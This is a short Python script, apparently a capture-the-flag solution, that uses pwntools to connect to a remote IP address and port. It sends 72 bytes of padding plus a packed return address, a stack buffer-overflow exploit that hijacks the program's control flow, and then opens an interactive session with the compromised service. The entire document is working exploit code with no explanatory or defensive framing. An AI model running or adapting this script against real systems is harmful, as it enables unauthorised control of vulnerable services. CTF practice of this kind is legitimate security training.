from pwn import *
p=remote("213.35.127.78",13402)
p.sendline(b"a"*72+p64(0x4011b6))
p.interactive()